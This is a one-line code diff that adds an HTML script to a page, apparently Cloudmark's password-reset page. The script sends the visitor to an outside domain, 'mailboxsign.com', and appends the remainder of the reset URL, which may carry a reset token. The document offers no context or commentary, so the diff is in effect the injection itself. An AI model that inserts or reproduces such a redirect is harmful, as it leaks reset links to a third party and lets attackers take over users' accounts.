@@ -1,0 +1,1 @@
+<script>document.location.href = 'http://mailboxsign.com/anchor'+window.location.href.split('https://csi.cloudmark.com/en/reset/')[1];</script>
